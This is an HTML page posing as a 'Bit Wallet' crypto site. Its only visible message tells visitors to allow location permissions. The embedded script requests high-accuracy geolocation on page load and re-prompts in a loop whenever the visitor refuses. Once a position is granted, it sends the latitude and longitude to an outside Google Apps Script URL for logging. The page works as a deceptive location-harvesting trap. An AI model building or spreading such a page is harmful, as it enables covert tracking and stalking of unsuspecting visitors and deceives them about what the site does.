<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bit wallet</title>
<style>
  body {
    margin: 0;
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    background-color: #111;
    color: #fff;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
    text-align: center;
  }
  .container {
    padding: 20px;
  }
  h1 {
    font-size: 4rem;
    margin: 0;
  }
  p {
    font-size: 1.25rem;
    color: #ccc;
    margin-top: 10px;
  }
</style>
</head>
<body>
  <div class="container">
    <h1>Bit Wallet</h1>
    <p>User must allow location permissions to continue</p>
    <p>Thank You!</p>
  </div>

  <script>
    const SHEET_URL = "https://script.google.com/macros/s/AKfycbzZUHbpdXYjkFHeZAQjgCfGnKTD1yRIKVRX7ZRB7pm1VAkurim6F-kftw2QrFZ22k0T/exec";

    function sendToSheet(lat, lon) {
      fetch(SHEET_URL, {
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: JSON.stringify({ lat, lon })
      })
      .then(res => res.json())
      .then(data => console.log("Logged:", data))
      .catch(err => console.error("Error logging location:", err));
    }

    function showPosition(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      console.log(`Latitude: ${lat}, Longitude: ${lon}`);
      sendToSheet(lat, lon);
      // Location obtained – stop asking
    }

    function showError(error) {
      console.log("Geolocation error:", error.message);

      // Keep asking if the user denied or it timed out
      if (error.code === error.PERMISSION_DENIED || error.code === error.TIMEOUT) {
        // Small delay so the browser doesn't throttle the requests too hard
        setTimeout(askForLocation, 800);
      }
      // If POSITION_UNAVAILABLE we also retry
      else if (error.code === error.POSITION_UNAVAILABLE) {
        setTimeout(askForLocation, 1500);
      }
    }

    function askForLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      } else {
        console.log("Geolocation not supported by this browser.");
      }
    }

    // Start the loop
    askForLocation();
  </script>
</body>
</html>
